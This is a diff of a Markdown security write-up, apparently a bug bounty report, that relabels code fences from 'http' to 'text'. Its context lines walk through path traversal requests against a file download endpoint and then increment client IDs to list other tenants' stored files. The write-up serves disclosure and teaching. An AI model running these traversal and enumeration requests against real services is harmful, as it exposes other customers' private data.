@@ -27,7 +27,7 @@ Anything that handles cross-user file storage in a multi-tenant context is worth
 
 The Asset Library exposed a file download endpoint that took two query parameters, `filename` and `folderPath`.
 
-```http
+```text
 GET https://api.target.com/api/clientpublicdoc?filename=try.svg&folderPath=
 ```
 
@@ -52,7 +52,7 @@ Every variation came back as an empty string. The application wasn't biting on a
 
 So we shifted focus and started fuzzing `folderPath` instead.
 
-```http
+```text
 GET /api/clientpublicdoc?filename=boot.ini&folderPath=../../../../../../
 ```
 
@@ -66,14 +66,14 @@ That was unexpected. The same request with `folderPath=` empty returned the orig
 
 To narrow things down further, the `filename` value was dropped altogether, and we varied just the depth of the traversal in `folderPath`.
 
-```http
+```text
 GET /api/clientpublicdoc?filename=&folderPath=../
 → "W10="   (base64 for: [])
 ```
 
 A literal empty JSON array. Now things were getting interesting.
 
-```http
+```text
 GET /api/clientpublicdoc?filename=&folderPath=../../
 → base64 decoded:
 {"message":"No HTTP resource was found that matches the request URI 'https://internal-dms-api.target.com/api/doc/Public/'."}
@@ -123,7 +123,7 @@ When you hit a dead end, the best move is usually to step back and re-read what 
 
 It turned up on the asset listing endpoint.
 
-```http
+```text
 GET https://api.target.com/api/clientpublicdoc/list
 ```
 
@@ -149,7 +149,7 @@ This is the endpoint the UI calls when rendering the list of files in the user's
 
 To validate this, a request was crafted using our own `sourceKey` in `folderPath`.
 
-```http
+```text
 GET /api/clientpublicdoc?filename=try.svg&folderPath=../../clientpublicdoc_clientid-5645_5645
 → base64 content of try.svg
 ```
@@ -160,7 +160,7 @@ Identical to what we got with the original empty `folderPath`. That confirmed it
 
 Just to be thorough, the same request with one fewer `../`.
 
-```http
+```text
 GET /api/clientpublicdoc?filename=try.svg&folderPath=../clientpublicdoc_clientid-5645_5645
 → ""
 ```
@@ -171,7 +171,7 @@ Empty. Good. That confirmed the exact depth of traversal needed to escape one le
 
 Next, the `filename` was removed entirely, leaving `folderPath` pointed at our own `sourceKey`.
 
-```http
+```text
 GET /api/clientpublicdoc?filename=&folderPath=../../clientpublicdoc_clientid-5645_5645
 ```
 
@@ -192,7 +192,7 @@ If client IDs were assigned incrementally, then guessing other tenants' `sourceK
 
 Incrementing the client ID by one:
 
-```http
+```text
 GET /api/clientpublicdoc?filename=&folderPath=../../clientpublicdoc_clientid-5646_5646
 ```
 
